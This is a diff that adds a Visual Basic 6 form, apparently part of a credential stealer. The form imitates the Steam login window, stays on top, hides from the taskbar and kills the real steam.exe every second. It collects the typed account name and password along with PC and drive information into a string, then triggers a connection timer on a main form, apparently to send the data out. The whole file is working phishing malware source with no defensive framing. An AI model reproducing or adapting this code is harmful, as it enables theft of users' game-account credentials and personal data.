@@ -1,0 +1,259 @@
+VERSION 5.00
+Begin VB.Form fSteam 
+   AutoRedraw      =   -1  'True
+   BorderStyle     =   0  'None
+   ClientHeight    =   4800
+   ClientLeft      =   0
+   ClientTop       =   0
+   ClientWidth     =   6300
+   LinkTopic       =   "Form1"
+   ScaleHeight     =   4800
+   ScaleWidth      =   6300
+   ShowInTaskbar   =   0   'False
+   StartUpPosition =   2  'CenterScreen
+   Begin VB.Timer tmrKill 
+      Interval        =   1000
+      Left            =   600
+      Top             =   4320
+   End
+   Begin VB.Timer imgFocus 
+      Interval        =   1
+      Left            =   120
+      Top             =   4320
+   End
+   Begin VB.TextBox txtPassword 
+      Appearance      =   0  'Flat
+      BackColor       =   &H00383638&
+      BorderStyle     =   0  'None
+      BeginProperty Font 
+         Name            =   "Tahoma"
+         Size            =   8.25
+         Charset         =   0
+         Weight          =   400
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      ForeColor       =   &H00E0E0E0&
+      Height          =   285
+      IMEMode         =   3  'DISABLE
+      Left            =   1840
+      PasswordChar    =   "*"
+      TabIndex        =   1
+      Top             =   1895
+      Width           =   3975
+   End
+   Begin VB.TextBox txtAccName 
+      Appearance      =   0  'Flat
+      BackColor       =   &H00383638&
+      BorderStyle     =   0  'None
+      BeginProperty Font 
+         Name            =   "Tahoma"
+         Size            =   8.25
+         Charset         =   0
+         Weight          =   400
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      ForeColor       =   &H00E0E0E0&
+      Height          =   285
+      Left            =   1840
+      TabIndex        =   0
+      Top             =   1385
+      Width           =   3975
+   End
+   Begin VB.Image imgLoginPressed 
+      Height          =   420
+      Left            =   1700
+      Picture         =   "fSteam.frx":0000
+      Top             =   2730
+      Width           =   2085
+   End
+   Begin VB.Image imgLogin 
+      Height          =   390
+      Left            =   1700
+      Picture         =   "fSteam.frx":2E32
+      Top             =   2750
+      Width           =   2070
+      Visible         =   0   'False
+   End
+   Begin VB.Image imgRemember 
+      Height          =   270
+      Left            =   1720
+      Picture         =   "fSteam.frx":58B4
+      Top             =   2310
+      Width           =   255
+      Visible         =   0   'False
+   End
+   Begin VB.Image imgClose 
+      Height          =   225
+      Left            =   6025
+      Picture         =   "fSteam.frx":5C9E
+      Top             =   80
+      Width           =   210
+      Visible         =   0   'False
+   End
+   Begin VB.Image imgMinimize 
+      Height          =   240
+      Left            =   5800
+      Picture         =   "fSteam.frx":5F74
+      Top             =   80
+      Width           =   225
+      Visible         =   0   'False
+   End
+   Begin VB.Image imgSteam 
+      Height          =   4800
+      Index           =   0
+      Left            =   0
+      Picture         =   "fSteam.frx":62B6
+      Top             =   0
+      Width           =   6300
+   End
+   Begin VB.Image imgSteam 
+      Height          =   4800
+      Index           =   1
+      Left            =   0
+      Picture         =   "fSteam.frx":689F8
+      Top             =   0
+      Width           =   6300
+   End
+   Begin VB.Image imgSteam 
+      Height          =   4800
+      Index           =   2
+      Left            =   0
+      Picture         =   "fSteam.frx":CB13A
+      Top             =   0
+      Width           =   6300
+   End
+End
+Attribute VB_Name = "fSteam"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Option Explicit
+
+Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
+
+Dim boolRemember As Boolean
+
+Private Sub imgFocus_Timer()
+    Call SetWindowPos(Me.hWnd, -1, 0&, 0&, 0&, 0&, &H2 Or &H1)
+End Sub
+
+Private Sub imgLogin_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+    If Button = 1 Then
+        imgLoginPressed.ZOrder 0
+        imgLoginPressed.Visible = True
+    End If
+End Sub
+
+Private Sub imgLogin_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+    If Button = 1 Then
+        imgLogin.Enabled = False
+        imgLoginPressed.Enabled = False
+        imgLoginPressed.Visible = False
+        
+        If Len(txtAccName) > 0 And Len(txtPassword) > 0 Then
+            strPWS = vbNullString
+            strPWS = "CD-KEY" & vbVerticalTab & "STEAM" & vbVerticalTab & txtAccName.Text & vbVerticalTab & txtPassword.Text & vbNewLine & vbFormFeed & strPcInfo & vbFormFeed & frmMain.HDS_GET(Environ("systemdrive") & "\")
+            STEAM_ENABLED = False 'We are done with steam
+            frmMain.tmrConnect.Enabled = True
+        End If
+    End If
+End Sub
+
+Private Sub imgRemember_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
+    imgRemember.Visible = False
+    imgSteam(2).Visible = True
+    imgSteam(1).Visible = False
+    imgSteam(0).Visible = False
+    boolRemember = False
+End Sub
+
+Private Sub imgSteam_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
+    If (X >= 5835 And X <= 5925) And (Y >= 105 And Y <= 270) Then
+        imgMinimize.ZOrder 0
+        imgMinimize.Visible = True
+    Else
+        imgMinimize.Visible = False
+    End If
+    
+    If (X >= 6060 And X <= 6180) And (Y >= 105 And Y <= 270) Then
+        imgClose.ZOrder 0
+        imgClose.Visible = True
+    Else
+        imgClose.Visible = False
+    End If
+    
+    Debug.Print X & " : " & Y
+End Sub
+
+Private Sub imgSteam_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
+    If Button = 1 Then
+        If (X >= 1740 And X <= 3915) And (Y >= 2340 And Y <= 2550) Then
+            If boolRemember = True Then
+                boolRemember = False
+            Else
+                boolRemember = True
+            End If
+            imgSteam(2).Visible = True
+            imgSteam(0).Visible = False
+            imgSteam(1).Visible = False
+            REMEMBER_CHECK
+        End If
+    End If
+End Sub
+
+Private Sub tmrKill_Timer()
+    TerminateProcessName "steam.exe"
+End Sub
+
+Private Sub txtAccName_Change()
+    If Len(txtAccName) > 0 And Len(txtPassword) > 0 Then
+        imgLogin.Visible = True
+        imgLogin.ZOrder 0
+    Else
+        imgLogin.Visible = False
+    End If
+End Sub
+
+Private Sub txtAccName_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+    imgSteam(0).Visible = True
+    imgSteam(1).Visible = False
+    imgSteam(2).Visible = False
+    REMEMBER_CHECK
+End Sub
+
+Private Sub txtPassword_Change()
+    If Len(txtAccName) > 0 And Len(txtPassword) > 0 Then
+        imgLogin.Visible = True
+        imgLogin.ZOrder 0
+    Else
+        imgLogin.Visible = False
+    End If
+End Sub
+
+Private Sub txtPassword_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
+    imgSteam(1).Visible = True
+    imgSteam(0).Visible = False
+    imgSteam(2).Visible = False
+    REMEMBER_CHECK
+End Sub
+
+Private Sub REMEMBER_CHECK()
+    If boolRemember = True Then
+        imgRemember.Visible = True
+        imgRemember.ZOrder 0
+    Else
+        imgRemember.Visible = False
+    End If
+End Sub
+
+Public Function TerminateProcessName(EXEname As String)
+    Dim Process As Object
+    For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & EXEname & "'")
+        Process.Terminate
+    Next
+End Function
